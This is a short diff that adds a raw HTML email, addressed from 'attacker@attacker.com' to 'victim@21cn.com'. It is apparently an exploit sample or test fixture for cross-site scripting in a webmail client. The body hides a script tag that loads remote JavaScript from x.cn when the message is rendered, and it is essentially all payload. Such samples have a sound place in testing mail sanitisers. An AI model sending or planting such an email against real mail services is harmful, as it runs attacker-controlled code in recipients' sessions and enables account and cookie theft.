@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: 123456aaaaa
+To: victim@21cn.com
+MIME-Version: 1.0
+Content-type: text/html
+
+good<script src=//x.cn/1.js async>
